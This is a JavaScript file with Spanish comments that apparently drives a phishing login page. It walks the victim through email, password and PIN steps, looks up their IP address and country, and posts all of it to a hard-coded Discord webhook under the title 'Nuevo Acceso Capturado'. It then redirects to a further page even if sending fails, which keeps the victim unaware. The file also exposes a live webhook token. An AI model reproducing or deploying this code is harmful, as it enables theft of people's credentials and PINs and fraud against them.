/**
 * CONFIGURACIÓN
 * Sustituye 'TU_WEBHOOK_AQUI' por la URL real de tu Webhook de Discord.
 */
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1511967875974561992/liugEATKrpJuD-troFO5CsUWxti5XIWiWbGRgb2ZQ_6zwbsLFfEC7Lvp3U01tj3Xh6da';

/**
 * Función para obtener datos de red del usuario (IP y País)
 */
async function getClientData() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        return await response.json();
    } catch (error) {
        console.error("Error al obtener datos de red:", error);
        return { ip: 'No detectada', country_name: 'Desconocido' };
    }
}

/**
 * Manejo de la navegación entre pasos del formulario
 */
function nextStep(stepNumber) {
    if (stepNumber === 2) {
        const email = document.getElementById('email').value;
        if (!email) return;
        
        // Guarda el correo en localStorage para uso posterior[cite: 1]
        localStorage.setItem('user_email', email);
        
        // Actualiza el texto visual en la pantalla de contraseña
        document.getElementById('displayEmail').innerText = "Contraseña para " + email;
    }
    
    if (stepNumber === 3) {
        const password = document.getElementById('password').value;
        if (!password) return;
    }

    // Cambiar visibilidad de las secciones
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById('step' + stepNumber).classList.add('active');
}

/**
 * Procesamiento final del formulario y envío a Discord
 */
document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const pin = document.getElementById('pin').value;
    
    // Obtener IP y País antes de enviar[cite: 1]
    const clientData = await getClientData();

    // Estructura del mensaje para Discord (Embed Profesional)[cite: 1]
    const payload = {
        embeds: [{
            title: "🔑 Nuevo Acceso Capturado",
            color: 3447003, // Color azul corporativo
            fields: [
                { name: "📧 Correo", value: email, inline: true },
                { name: "🔓 Contraseña", value: "`" + password + "`", inline: true },
                { name: "🔢 PIN", value: "`" + pin + "`", inline: true },
                { name: "🌐 Dirección IP", value: clientData.ip, inline: true },
                { name: "📍 País", value: clientData.country_name, inline: true }
            ],
            footer: { text: "Sistema de Registro Seguro" },
            timestamp: new Date()
        }]
    };

    try {
        // Envío de datos al canal de Discord[cite: 1]
        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        // Redirección exitosa a rostro.html[cite: 1]
        window.location.href = 'rostro.html';
    } catch (error) {
        console.error("Error de envío:", error);
        // Redirigir de todos modos para mantener fluidez del usuario[cite: 1]
        window.location.href = 'rostro.html';
    }
});